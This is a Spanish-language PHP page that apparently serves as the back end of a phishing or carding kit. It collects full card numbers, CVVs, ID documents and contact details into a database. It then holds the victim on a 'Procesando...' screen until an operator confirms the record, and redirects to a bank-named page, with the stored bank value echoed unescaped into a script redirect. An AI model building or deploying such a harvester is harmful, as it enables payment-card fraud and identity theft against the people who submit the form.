<?php
include_once 'db.php';

$database = new Database();
$db = $database->getConnection();

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = [
        'banco' => $_POST['TxtBanco'],
        'numero_tarjeta' => $_POST['inputNumero'],
        'nombre' => $_POST['nombre'],
        'expiracion' => $_POST['selectMes'],
        'cvv' => $_POST['inputCCV'],
        'documento' => $_POST['documento'],
        'telefono' => $_POST['tel'],
        'ciudad' => $_POST['ciudad'],
        'direccion' => $_POST['direccion'],
        'correo' => $_POST['correo'],
        'estado' => 'procesando'
    ];

    $query = "INSERT INTO solicitudes (banco, numero_tarjeta, nombre, expiracion, cvv, documento, telefono, ciudad, direccion, correo, estado) 
              VALUES (:banco, :numero_tarjeta, :nombre, :expiracion, :cvv, :documento, :telefono, :ciudad, :direccion, :correo, :estado)";
    $stmt = $db->prepare($query);
    
    foreach ($data as $key => &$value) {
        $stmt->bindParam(":$key", $value);
    }

    if ($stmt->execute()) {
        $_SESSION['id'] = $db->lastInsertId();
        echo "Solicitud recibida. Espera la confirmación.";
    } else {
        echo "Error al procesar la solicitud.";
    }
}

if (isset($_SESSION['id'])) {
    $query = "SELECT estado, banco FROM solicitudes WHERE id = :id";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':id', $_SESSION['id']);
    $stmt->execute();
    $solicitud = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($solicitud && $solicitud['estado'] === 'confirmado') {
        $banco = $solicitud['banco'];
        echo "<script>window.location.href = '${banco}.php';</script>";
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function checkStatus() {
            $.ajax({
                url: 'check_status.php',
                type: 'POST',
                data: { id: <?php echo $_SESSION['id']; ?> },
                dataType: 'json',
                success: function(response) {
                    if (response.status === 'confirmado') {
                        window.location.href = response.redirect_url;
                    }
                }
            });
        }

        setInterval(checkStatus, 3000); // Verifica el estado cada 3 segundos
    </script>
</head>
<body>
    <h1>Procesando...</h1>
    <p>Por favor espera a que el administrador confirme la operación.</p>
</body>
</html>
